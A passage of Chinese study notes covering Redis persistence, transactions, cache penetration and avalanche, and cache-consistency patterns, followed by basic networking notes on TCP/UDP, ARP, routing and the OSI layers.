<li><strong>allkeys-lfu（least frequently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最不经常使用的 key</li>
</ol>
<h2 id="Redis持久化"><a href="#Redis持久化" class="headerlink" title="Redis持久化"></a>Redis持久化</h2><p>一般不要开启持久化, 存的是缓存, 看具体场景</p>
<p>RDB(snapshotting): 默认的;  恢复速度快缺失的多; 会fork一个进程使用cow来拍快照,主进程修改需要新开内存,然后修改指针, 子进程拍的快照还是原来的数据;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">save 900 1           #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 300 10          #在300秒(5分钟)之后，如果至少有10个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 60 10000        #在60秒(1分钟)之后，如果至少有10000个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br></pre></td></tr></table></figure>

<p>AOF(append only file) : appendonly yes; 将命令都写入磁盘中的AOF文件.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">appendfsync always    #每次有数据修改发生时都会写入磁盘AOF文件,这样会严重降低Redis的速度</span><br><span class="line">appendfsync everysec  #每秒钟同步一次，显示地将多个写命令同步到硬盘,每秒会刷新一次去磁盘AOF文件中,丢失小于一个buffer</span><br><span class="line">appendfsync no        #让操作系统决定何时进行写回磁盘,可能会丢一个buffer</span><br></pre></td></tr></table></figure>

<p>redis 4.0 支持混合模式(默认关闭,aof-use-rdb-preamble开启), 快速加载同时避免丢失过多的数据, 当然缺点就是AOF里面的RDB部分是压缩格式不再是AOF格式,可读性差.</p>
<h2 id="AOF重写"><a href="#AOF重写" class="headerlink" title="AOF重写"></a>AOF重写</h2><p>AOF重写可以产生一个新的AOF文件, 状态一样,体积更小;</p>
<p>执行 BGREWRITEAOF 命令时，Redis 服务器会维护一个 AOF 重写缓冲区，该缓冲区会在子进程创建新 AOF 文件期间，记录服务器执行的所有写命令。当子进程完成创建新 AOF 文件的工作之后，服务器会将重写缓冲区中的所有内容追加到新 AOF 文件的末尾，使得新旧两个 AOF 文件所保存的数据库状态一致。最后，服务器用新的 AOF 文件替换旧的 AOF 文件，以此来完成 AOF 文件重写操作</p>
<h2 id="Redis-事务"><a href="#Redis-事务" class="headerlink" title="Redis 事务"></a>Redis 事务</h2><p>在第一窗口,通过WATCH, 监控data1, 并开启事务,添加设置data2的命令到命令队列中, 然后在第二个窗口修改data1,  执行EXEC命令, 此时执行EXEC命令,此时会返回了一个nil, 而我们获取data2的值, 返回的也是nil; 当被监控的数据发生改变后, 开启的事务执行是无法成功的, 只有被监控的数据不发生变化, 事务才能正常执行; discard清除命令, unwatch: 清除所有先前为一个事务监控的建;</p>
<p>Redis 可以通过 <strong>MULTI，EXEC，DISCARD 和 WATCH</strong> 等命令来实现事务(transaction)功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; MULTI</span><br><span class="line">OK</span><br><span class="line">&gt; INCR foo</span><br><span class="line">QUEUED</span><br><span class="line">&gt; INCR bar</span><br><span class="line">QUEUED</span><br><span class="line">&gt; EXEC</span><br><span class="line">1) (<span class="built_in">integer</span>) 1</span><br><span class="line">2) (<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<p>使用 <a href="https://redis.io/commands/multi">MULTI</a>命令后可以输入多个命令。Redis 不会立即执行这些命令，而是将它们放到队列，当调用了<a href="https://redis.io/commands/exec">EXEC</a>命令将执行所有命令。</p>
<p>但是，Redis 的事务和我们平时理解的关系型数据库的事务不同。我们知道事务具有四大特性： <strong>1. 原子性</strong>，<strong>2. 隔离性</strong>，<strong>3. 持久性</strong>，<strong>4. 一致性</strong>。</p>
<ol>
<li><strong>原子性（Atomicity）：</strong> 事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用；</li>
<li><strong>隔离性（Isolation）：</strong> 并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的；</li>
<li><strong>持久性（Durability）：</strong> 一个事务被提交之后。它对数据库中数据的改变是持久的，即使数据库发生故障也不应该对其有任何影响。</li>
<li><strong>一致性（Consistency）：</strong> 执行事务前后，数据保持一致，多个事务对同一个数据读取的结果是相同的；</li>
</ol>
<p><strong>Redis 是不支持 roll back 的，因而不满足原子性的（而且不满足持久性）。</strong></p>
<p>Redis 官网也解释了自己为啥不支持回滚。简单来说就是 Redis 开发者们觉得没必要支持回滚，这样更简单便捷并且性能更好。Redis 开发者觉得即使命令执行错误也应该在开发过程中就被发现而不是生产过程中。</p>
<p>你可以将 Redis 中的事务就理解为 ：<strong>Redis 事务提供了一种将多个命令请求打包的功能。然后，再按顺序执行打包的所有命令，并且不会被中途打断。</strong></p>
<p><strong>相关 issue</strong> :<a href="https://github.com/Snailclimb/JavaGuide/issues/452">issue452: 关于 Redis 事务不满足原子性的问题</a> ，推荐阅读：<a href="https://zhuanlan.zhihu.com/p/43897838">https://zhuanlan.zhihu.com/p/43897838</a> 。</p>
<p>编译器错误(只要有语法错误, 所有命令都不会执行): 在一个事务中，当命令出现错误时，后续命令正确依旧是可以添加到命令队列中去得，但是使用 EXEC 命令执行命令队列的时候，就会报错，里面一个命令都无法执行, 并且队列中正确的命令也不会被执行。</p>
<p>运行时错误(正确的都会运行,错误的那一条命令不会执行): 这种错误不是命令错误，而是因为对命令理解不透彻出现的使用错误，在执行过程中会报错，因为 username1 不是 list 类型，它只是一个 string 类型。有一点需要注意，从结果可以看出，第一条命令是执行成功了的，所有我们使用”get username1”命令，返回了”alan”结果，<strong>这也证明了 Redis 是不支持事务回滚的</strong>。</p>
<h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><p>缓存穿透说简单点就是大量请求的 key 根本不存在于缓存中，导致请求直接到了数据库上，根本没有经过缓存这一层。举个例子：某个黑客故意制造我们缓存中不存在的 key 发起大量请求，导致大量请求落到数据库。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>最基本的就是首先做好参数校验，一些不合法的参数请求直接抛出异常信息返回给客户端。比如查询的数据库 id 不能小于0、传入的邮箱格式不对的时候直接返回错误消息给客户端等等。</p>
<h4 id="缓存无效key"><a href="#缓存无效key" class="headerlink" title="缓存无效key"></a>缓存无效key</h4><p>如果缓存和数据库都查不到某个 key 的数据就写一个到 Redis 中去并设置过期时间，具体命令如下: <code>SET key value EX 10086</code> 。这种方式可以解决请求的 key 变化不频繁的情况，如果黑客恶意攻击，每次构建不同的请求 key，会导致Redis中缓存大量无效的 key 。很明显，这种方案并不能从根本上解决此问题。如果非要用这种方式来解决穿透问题的话，尽量将无效的 key 的过期时间设置短一点比如 1 分钟。</p>
<p>另外，这里多说一嘴，一般情况下我们是这样设计 key 的： <code>表名:列名:主键名:主键值</code> 。</p>
<p>如果用 Java 代码展示的话，差不多是下面这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInclNullById</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">    <span class="comment">// 从缓存中获取数据</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">cacheValue</span> <span class="operator">=</span> cache.get(id);</span><br><span class="line">    <span class="comment">// 缓存为空</span></span><br><span class="line">    <span class="keyword">if</span> (cacheValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 从数据库中获取</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">storageValue</span> <span class="operator">=</span> storage.get(key);</span><br><span class="line">        <span class="comment">// 缓存空对象</span></span><br><span class="line">        cache.set(key, storageValue);</span><br><span class="line">        <span class="comment">// 如果存储数据为空，需要设置一个过期时间(300秒)</span></span><br><span class="line">        <span class="keyword">if</span> (storageValue == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 必须设置过期时间，否则有被攻击的风险</span></span><br><span class="line">            cache.expire(key, <span class="number">60</span> * <span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> storageValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cacheValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h4><p>false positive</p>
<p>布隆过滤器是一个非常神奇的数据结构，通过它我们可以非常方便地判断一个给定数据是否存在于海量数据中。我们需要的就是判断 key 是否合法，有没有感觉布隆过滤器就是我们想要找的那个“人”。</p>
<p>具体是这样做的：把所有可能存在的请求的值都存放在布隆过滤器中，当用户请求过来，先判断用户发来的请求的值是否存在于布隆过滤器中。不存在的话，直接返回请求参数错误信息给客户端，存在的话才会走下面的流程。</p>
<p>但是，需要注意的是布隆过滤器可能会存在误判的情况。总结来说就是： <strong>布隆过滤器说某个元素存在，小概率会误判。布隆过滤器说某个元素不在，那么这个元素一定不在。</strong></p>
<p>为什么会出现误判的情况呢? 我们还要从布隆过滤器的原理来说！</p>
<p>我们先来看一下，<strong>当一个元素加入布隆过滤器中的时候，会进行哪些操作：</strong></p>
<ol>
<li>使用布隆过滤器中的哈希函数对元素值进行计算，得到哈希值（有几个哈希函数得到几个哈希值）。</li>
<li>根据得到的哈希值，在位数组中把对应下标的值置为 1。</li>
</ol>
<p>我们再来看一下，<strong>当我们需要判断一个元素是否存在于布隆过滤器的时候，会进行哪些操作：</strong></p>
<ol>
<li>对给定元素再次进行相同的哈希计算；</li>
<li>得到值之后判断位数组中的每个元素是否都为 1，如果值都为 1，那么说明这个值可能在布隆过滤器中，如果存在一个值不为 1，说明该元素不在布隆过滤器中。</li>
</ol>
<p>然后，一定会出现这样一种情况：<strong>不同的字符串可能哈希出来的位置相同。</strong> （可以适当增加位数组大小或者调整我们的哈希函数来降低概率）</p>
<p>更多关于布隆过滤器的内容可以看我的这篇原创：<a href="https://github.com/Snailclimb/JavaGuide/blob/master/docs/dataStructures-algorithms/data-structure/bloom-filter.md">《不了解布隆过滤器？一文给你整的明明白白！》</a> </p>
<h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><h3 id="什么是缓存雪崩？"><a href="#什么是缓存雪崩？" class="headerlink" title="什么是缓存雪崩？"></a>什么是缓存雪崩？</h3><p><strong>缓存在同一时间大面积的失效，后面的请求都直接落到了数据库上，造成数据库短时间内承受大量请求。</strong> 这就好比雪崩一样，摧枯拉朽之势，数据库的压力可想而知，可能直接就被这么多请求弄宕机了。</p>
<p>举个例子：系统的缓存模块出了问题比如宕机导致不可用。造成系统的所有访问，都要走数据库。</p>
<p><strong>有一些被大量访问数据（热点缓存）在某一时刻大面积失效，导致对应的请求直接落到了数据库上。</strong> 这样的情况，有下面几种解决办法：</p>
<p>举个例子 ：秒杀开始 12 个小时之前，我们统一存放了一批商品到 Redis 中，设置的缓存过期时间也是 12 个小时，那么秒杀开始的时候，这些秒杀的商品的访问直接就失效了。导致的情况就是，相应的请求直接就落到了数据库上，就像雪崩一样可怕。</p>
<h3 id="有哪些解决办法？"><a href="#有哪些解决办法？" class="headerlink" title="有哪些解决办法？"></a>有哪些解决办法？</h3><p><strong>针对 Redis 服务不可用的情况：</strong></p>
<ol>
<li>采用 Redis 集群，避免单机出现问题整个缓存服务都没办法使用。</li>
<li>限流，避免同时处理大量的请求。</li>
</ol>
<p><strong>针对热点缓存失效的情况：</strong></p>
<ol>
<li>设置不同的失效时间比如随机设置缓存的失效时间。</li>
<li>缓存永不失效。</li>
</ol>
<h2 id="如何保证缓存和数据库数据的一致性？"><a href="#如何保证缓存和数据库数据的一致性？" class="headerlink" title="如何保证缓存和数据库数据的一致性？"></a>如何保证缓存和数据库数据的一致性？</h2><h3 id="Cache-Aside-Pattern（旁路缓存模式）"><a href="#Cache-Aside-Pattern（旁路缓存模式）" class="headerlink" title="Cache Aside Pattern（旁路缓存模式）"></a>Cache Aside Pattern（旁路缓存模式）</h3><p>Cache Aside Pattern中遇到写请求是这样的：更新DB，然后直接删除 cache 。</p>
<p>如果更新数据库成功，而删除缓存这一步失败的情况的话，简单说两个解决方案：</p>
<ol>
<li><strong>缓存失效时间变短（不推荐，治标不治本）</strong> ：我们让缓存数据的过期时间变短，这样的话缓存就会从数据库中加载数据。另外，这种解决办法对于先操作缓存后操作数据库的场景不适用。</li>
<li><strong>增加 cache 更新重试机制（常用）</strong>： 如果cache服务当前不可用导致缓存删除失败的话，我们就隔一段时间进行重试，重试次数可以自己定。如果多次重试还是失败的话，我们可以把当前更新失败的 key 存入队列中，等缓存服务可用之后，再将缓存中对应的 key 删除即可。</li>
</ol>
<p><strong>Cache Aside Pattern 是我们平时使用比较多的一个缓存读写模式，比较适合读请求比较多的场景。</strong></p>
<p>Cache Aside Pattern中服务端需要同时维系DB和 cache，并且是以 DB 的结果为准。</p>
<p>下面我们来看一下这个策略模式下的缓存读写步骤。</p>
<p><strong>写</strong> ：</p>
<ul>
<li>先更新DB</li>
<li>然后直接删除cache</li>
</ul>
<p>简单画了一张图帮助大家理解写的步骤。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848890.png" alt="img"></p>
<p><strong>读</strong> :</p>
<ul>
<li>从 cache 中读取数据，读取到就直接返回</li>
<li>cache中读取不到的话，就从 DB 中读取数据返回</li>
<li>再把数据放到 cache 中。</li>
</ul>
<p>简单画了一张图帮助大家理解读的步骤。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848041.png" alt="img"></p>
<p>你仅仅了解了上面这些内容的话是远远不够的，我们还要搞懂其中的原理。 </p>
<p>比如说面试官很可能会追问：“<strong>在写数据的过程中，可以先删除 cache ，后更新 DB 么？</strong>”</p>
<p><strong>答案：</strong> 那肯定是不行的！因为这样可能会造成<strong>数据库（DB）和缓存（Cache）数据不一致</strong>的问题。为什么呢？比如说请求1 先写数据A，请求2随后读数据A的话就很有可能产生数据不一致性的问题。这个过程可以简单描述为：</p>
<blockquote>
<p>请求1先把cache中的A数据删除 -&gt; 请求2从DB中读取数据-&gt;请求1再把DB中的A数据更新。</p>
</blockquote>
<p>当你这样回答之后，面试官可能会紧接着就追问：“<strong>在写数据的过程中，先更新DB，后删除cache就没有问题了么？</strong>”</p>
<p><strong>答案：</strong> 理论上来说还是可能会出现数据不一致性的问题，不过概率非常小，因为缓存的写入速度是比数据库的写入速度快很多！</p>
<p>比如请求1先读数据 A，请求2随后写数据A，并且数据A不在缓存中的话也有可能产生数据不一致性的问题。这个过程可以简单描述为：</p>
<blockquote>
<p>请求1从DB读数据A-&gt;请求2写更新数据 A 到数据库并把删除cache中的A数据-&gt;请求1将数据A写入cache。</p>
</blockquote>
<p>现在我们再来分析一下 <strong>Cache Aside Pattern 的缺陷</strong>。</p>
<p><strong>缺陷1：首次请求数据一定不在 cache 的问题</strong></p>
<p>解决办法：可以将热点数据可以提前放入cache 中。</p>
<p><strong>缺陷2：写操作比较频繁的话导致cache中的数据会被频繁被删除，这样会影响缓存命中率 。</strong></p>
<p>解决办法：</p>
<ul>
<li>数据库和缓存数据强一致场景 ：更新DB的时候同样更新cache，不过我们需要加一个锁&#x2F;分布式锁来保证更新cache的时候不存在线程安全问题。</li>
<li>可以短暂地允许数据库和缓存数据不一致的场景 ：更新DB的时候同样更新cache，但是给缓存加一个比较短的过期时间，这样的话就可以保证即使数据不一致的话影响也比较小。</li>
</ul>
<h3 id="Read-x2F-Write-Through-Pattern（读写穿透）"><a href="#Read-x2F-Write-Through-Pattern（读写穿透）" class="headerlink" title="Read&#x2F;Write Through Pattern（读写穿透）"></a><a href="https://snailclimb.gitee.io/javaguide/#/docs/database/Redis/3%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BC%93%E5%AD%98%E8%AF%BB%E5%86%99%E7%AD%96%E7%95%A5?id=readwrite-through-pattern%EF%BC%88%E8%AF%BB%E5%86%99%E7%A9%BF%E9%80%8F%EF%BC%89">Read&#x2F;Write Through Pattern（读写穿透）</a></h3><p>Read&#x2F;Write Through Pattern 中服务端把 cache 视为主要数据存储，从中读取数据并将数据写入其中。cache 服务负责将此数据读取和写入 DB，从而减轻了应用程序的职责。</p>
<p>这种缓存读写策略小伙伴们应该也发现了在平时在开发过程中非常少见。抛去性能方面的影响，大概率是因为我们经常使用的分布式缓存 Redis 并没有提供 cache 将数据写入DB的功能。</p>
<p><strong>写（Write Through）：</strong></p>
<ul>
<li>先查cache，cache中不存在，直接更新DB。</li>
<li>cache中存在，则先更新cache，然后 cache 服务自己更新 DB（<strong>同步更新 cache 和 DB</strong>）。</li>
</ul>
<p>简单画了一张图帮助大家理解写的步骤。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848046.png" alt="img"></p>
<p><strong>读(Read Through)：</strong></p>
<ul>
<li>从 cache 中读取数据，读取到就直接返回 。</li>
<li>读取不到的话，先从 DB 加载，写入到 cache 后返回响应。</li>
</ul>
<p>简单画了一张图帮助大家理解读的步骤。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848057.png" alt="img"></p>
<p>Read-Through Pattern 实际只是在 Cache-Aside Pattern 之上进行了封装。在 Cache-Aside Pattern 下，发生读请求的时候，如果 cache 中不存在对应的数据，是由客户端自己负责把数据写入 cache，而 Read Through Pattern 则是 cache 服务自己来写入缓存的，这对客户端是透明的。</p>
<p>和 Cache Aside Pattern 一样， Read-Through Pattern 也有首次请求数据一定不再 cache 的问题，对于热点数据可以提前放入缓存中。</p>
<h3 id="Write-Behind-Pattern（异步缓存写入）"><a href="#Write-Behind-Pattern（异步缓存写入）" class="headerlink" title="Write Behind Pattern（异步缓存写入）"></a><a href="https://snailclimb.gitee.io/javaguide/#/docs/database/Redis/3%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BC%93%E5%AD%98%E8%AF%BB%E5%86%99%E7%AD%96%E7%95%A5?id=write-behind-pattern%EF%BC%88%E5%BC%82%E6%AD%A5%E7%BC%93%E5%AD%98%E5%86%99%E5%85%A5%EF%BC%89">Write Behind Pattern（异步缓存写入）</a></h3><p>Write Behind Pattern 和 Read&#x2F;Write Through Pattern 很相似，两者都是由 cache 服务来负责 cache 和 DB 的读写。</p>
<p>但是，两个又有很大的不同：<strong>Read&#x2F;Write Through 是同步更新 cache 和 DB，而 Write Behind Caching 则是只更新缓存，不直接更新 DB，而是改为异步批量的方式来更新 DB。</strong></p>
<p>很明显，这种方式对数据一致性带来了更大的挑战，比如cache数据可能还没异步更新DB的话，cache服务可能就就挂掉了。</p>
<p>这种策略在我们平时开发过程中也非常非常少见，但是不代表它的应用场景少，比如消息队列中消息的异步写入磁盘、MySQL 的 InnoDB Buffer Pool 机制都用到了这种策略。</p>
<p>Write Behind Pattern 下 DB 的写性能非常高，非常适合一些数据经常变化又对数据一致性要求没那么高的场景，比如浏览量、点赞量。</p>
<p>参考</p>
<ul>
<li>《Redis 开发与运维》</li>
<li>《Redis 设计与实现》</li>
<li>Redis 命令总结：<a href="http://redisdoc.com/string/set.html">http://Redisdoc.com/string/set.html</a></li>
<li>通俗易懂的 Redis 数据结构基础教程：<a href="https://juejin.im/post/5b53ee7e5188251aaa2d2e16">https://juejin.im/post/5b53ee7e5188251aaa2d2e16</a></li>
<li>WHY Redis choose single thread (vs multi threads): <a href="https://medium.com/@jychen7/sharing-redis-single-thread-vs-multi-threads-5870bd44d153">https://medium.com/@jychen7/sharing-redis-single-thread-vs-multi-threads-5870bd44d153</a></li>
</ul>
<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><p>有状态：<br>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：还不错，挺好吃的。</p>
<p>无状态：<br>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：？？？啊？啥？啥味道怎么样？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848125.png" alt="img"></p>
<p>在发送方，SSL接受应用层的数据（如http或IMap报文），对数据进行加密，然后把加了密的数据送往TCP套接字。 在接受方，SSL从TCP套接字读取数据，解密后把数据交给应用层。</p>
<p>在Internet上传输音频视频面临的问题？ 占用的带宽高，网速需要恒定，延迟低，数据信息。</p>
<p>网络层防火墙：基于数据包，源地址 目标地址，协议和端口，控制流量</p>
<p>应用层防火墙：数据包 原地址 目标地址 协议 端口 用户名 时间段 内容 防病毒进入内网</p>
<p>QOS(quality of service)</p>
<p>TCP协议是一个面向连接的、可靠的传输协议，它提供一种可靠的字节流，能保证数据完整、无损并且按顺序到达。TCP尽量连续不断地测试网络的负载并且控制发送数据的速度以避免网络过载。另外，TCP试图将数据按照规定的顺序发送。</p>
<p>UDP协议是一个无连接的数据报协议，是一个“尽力传递”和“不可靠”协议，不会对数据包是否已经到达目的地进行检查，并且不保证数据包按顺序到达。</p>
<p>总体来说，TCP协议传输效率低，但可靠性强；UDP协议传输效率高，但可靠性略低，适用于传输可靠性要求不高、体量小的数据（比如QQ聊天数据）。</p>
<p>集线器: 无脑转发,通过查看mac看是否是给自己的数据包,不是就丢弃</p>
<p>交换机: 可以自学习,能够通过mac地址定向转发</p>
<p>默认网关: 就是在自己电脑里配置的一个 IP 地址，以便在发给不同子网的机器时，发给这个 IP 地址。</p>
<p>arp : 每台电脑都有一个arp缓存表,电脑 A 为了知道电脑 B（192.168.0.2）的 MAC 地址，将会<strong>广播</strong>一条 arp 请求，B 收到请求后，带上自己的 MAC 地址给 A 一个<strong>响应</strong>。此时 A 便更新了自己的 arp 表。</p>
<p>Vpn: 数据包里包含数据包</p>
<h2 id="马士兵"><a href="#马士兵" class="headerlink" title="马士兵"></a>马士兵</h2><p>有可能ack+fin包一起发, 4次挥手的时候可能只抓到3个包;</p>
<p>61.135.169.121 先和路由表的第一个mask做按位与,然后与网络号192.168.150.0对比, 不对; 然后这条记录作废;</p>
<p>再和0.0.0.0做按位与, 等于destination, 然后知道应该转发到192.168.150.2, 但是这个不能把目标地址直接改为192.168.150.2, 这个时候就需要数据链路层, 在数据链路层再套一层mac地址;</p>
<p>ip地址是一直不变的,mac地址一直在替换, ip是端到端, mac地址是节点到节点之间;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848243.png" alt="截屏2021-05-14 下午8.38.07"></p>
<p>在物理层会先加一个前导码, 前导码的作用就是告诉接收端接下来的数据是帧数据，它是用来分隔两个帧的标志。一是让接收端快速判断接收到的一帧数据格式是否是正确的，因为每一帧必然是前导码开头，如果不是，那么数据肯定有问题。二是在发现数据有问题时，能够快速找到下一帧的起始点，从而知道要丢弃多少错误数据。</p>
<p>nc <a href="http://www.baidu.com/">www.baidu.com</a> 80</p>
<p>相当于浏览器链接上了百度的80端口,然后按照http协议发送东西过去, 它就会回复</p>
<p>curl <a href="http://www.baidu.com/">www.baidu.com:80</a></p>
<p>curl相当于封装了好几个指令, 直接访问百度,然后断开, 走完整个生命周期;</p>
<h3 id="ARP过程"><a href="#ARP过程" class="headerlink" title="ARP过程"></a>ARP过程</h3><p>ARP（Address Resolution Protocol，地址解析协议）</p>
<p>在局域网中，当主机或其它网络设备有数据要发送给另一个主机或设备时，它必须知道对方的网络层地址（即IP地址）。但是仅仅有IP地址是不够的，因为IP数据报文必须封装成帧才能通过物理网络发送，因此发送站还必须有接收站的物理地址，所以需要一个从IP地址到物理地址的映射。APR就是实现这个功能的协议。</p>
<p> 假设主机A和B在，主机A要向主机B发送信息。具体的地址解析过程如下  </p>
<ul>
<li><p>主机A首先查看自己的ARP表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。 </p>
</li>
<li><p>如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。</p>
</li>
<li><p>主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以<strong>单播</strong>方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</p>
</li>
<li><p>主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。 </p>
</li>
<li><p>当主机A和主机B不在一个网段时，主机A就会先向网关发出ARP请求，ARP请求报文中的目标IP地址为网关的IP地址。当主机A从收到的响应报文中获得网关的MAC地址后，将报文封装并发给网关。如果网关没有主机B的ARP表项，网关会广播ARP请求，目标IP地址为主机B的IP地址，当网关从收到的响应报文中获得主机B的MAC地址后，就可以将报文发给主机B；如果网关已经有主机B的ARP表项，网关直接把报文发给主机B。 未知目的MAC的时候，目的Mac可以是：ffff.ffff.ffff.ffff</p>
</li>
</ul>
<h3 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h3><p>一个网卡可以通向两个网络</p>
<h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>socket是一个4元组, 用4元组描述;</p>
<p>客户端连接服务器80端口能有65535个, 连接90也有65535个, 如果客户端有好几个ip地址就能可以实现百万连接</p>
<h2 id="OSI七层"><a href="#OSI七层" class="headerlink" title="OSI七层"></a>OSI七层</h2><p>物联网苏汇试用</p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p> 通过应用进程的及交互来完成特定网络应用; 应用进程间的通信和交互规则; 不同的网络应用需要不用的应用协议, DNS,HTTP,SMTP; 应用层交互的数据单元称为报文</p>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责向两台主机进程之间的通信提供通用的数据传输服务; 应用进程利用该服务传送应用层报文; 通用是指多种应用可以使用同一个运输层服务; </p>
<p>由于一台主机可同时运行多个线程，因此运输层有复用和分用的功能。所谓复用就是指多个应用层进程可同时使用下面运输层的服务，分用和复用相反，是运输层把收到的信息分别交付上面应用层中的相应进程。</p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>在计算机网络中进行通行的两个计算机之间可能会经过多个数据链路, 也能会经过多个通信子网, 网络层的任务就会选择合适的网间路由和交换节点; 在发送数据时, 网络层把运输层参生的报文段或用户数据报封装成分组和包进行传送; 在TCP&#x2F;IP协议中, 由于网络层使用ip协议, 因此分组也叫IP数据包, 简称数据报;</p>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p><strong>数据链路层(data link layer)通常简称为链路层。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。</strong> 在两个相邻节点之间传送数据时，<strong>数据链路层将网络层交下来的 IP 数据报组装成帧</strong>，在两个相邻节点间的链路上传送帧。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）。</p>
<p>在接收数据时，控制信息使接收端能够知道一个帧从哪个比特开始和到哪个比特结束。这样，数据链路层在收到一个帧后，就可从中提出数据部分，上交给网络层。 控制信息还使接收端能够检测到所收到的帧中有无差错。如果发现差错，数据链路层就简单地丢弃这个出了差错的帧，以避免继续在网络中传送下去白白浪费网络资源。如果需要改正数据在链路层传输时出现差错（这就是说，数据链路层不仅要检错，而且还要纠错），那么就要采用可靠性传输协议来纠正出现的差错。这种方法会使链路层的协议复杂些。</p>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>在物理层上所传送的数据单位是比特。</p>
<p><strong>物理层(physical layer)的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异，</strong> 使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。</p>
<p>在互联网使用的各种协议中最重要和最著名的就是 TCP&#x2F;IP 两个协议。现在人们经常提到的TCP&#x2F;IP并不一定单指TCP和IP这两个具体的协议，而往往表示互联网所使用的整个TCP&#x2F;IP协议族。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848265.png" alt="七层体系结构图"></p>
<h2 id="整个传输过程"><a href="#整个传输过程" class="headerlink" title="整个传输过程"></a>整个传输过程</h2><h3 id="电脑视角："><a href="#电脑视角：" class="headerlink" title="电脑视角："></a><strong>电脑视角</strong>：</h3><ul>
<li>首先我要知道我的 IP 以及对方的 IP</li>
<li>通过子网掩码判断我们是否在同一个子网</li>
<li>在同一个子网就通过 arp 获取对方 mac 地址直接扔出去</li>
<li>不在同一个子网就通过 arp 获取默认网关的 mac 地址直接扔出去</li>
</ul>
<h3 id="交换机视角："><a href="#交换机视角：" class="headerlink" title="交换机视角："></a><strong>交换机视角：</strong></h3><ul>
<li>我收到的数据包必须有目标 MAC 地址</li>
<li>通过 MAC 地址表查映射关系</li>
<li>查到了就按照映射关系从我的指定端口发出去</li>
<li>查不到就所有端口都发出去</li>
</ul>
<h3 id="路由器视角："><a href="#路由器视角：" class="headerlink" title="路由器视角："></a><strong>路由器视角：</strong></h3><ul>
<li>我收到的数据包必须有目标 IP 地址</li>
